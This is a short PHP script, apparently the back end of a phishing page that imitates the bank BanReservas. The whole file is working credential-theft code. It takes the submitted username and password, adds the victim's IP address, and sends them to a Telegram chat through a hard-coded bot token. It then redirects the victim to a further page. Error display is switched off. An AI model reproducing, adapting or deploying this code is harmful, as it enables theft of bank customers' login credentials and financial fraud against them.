<?php
ini_set("display_errors", 0);
@$userp = $_SERVER['REMOTE_ADDR'];

////////////////////


////////////////////

if ( isset ($_POST['ipx1']) && isset ($_POST['ipx2'])  ){

$message = ".:::BanReservas:::.\r\nUsuario: ".$_POST['ipx1']."\r\nClave: ".$_POST['ipx2']."\r\n".$userp."";
  
$apiToken = "5984973262:AAHOKiUoO1lwfgX1BPVBLTsWTa-S_ntHMS8";


$data = [
  'chat_id' => "5512074919",

   'text' => $message
];

$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );

@header('Location: coord.html');

}else{ header ('location: index.html'); exit(); }

?>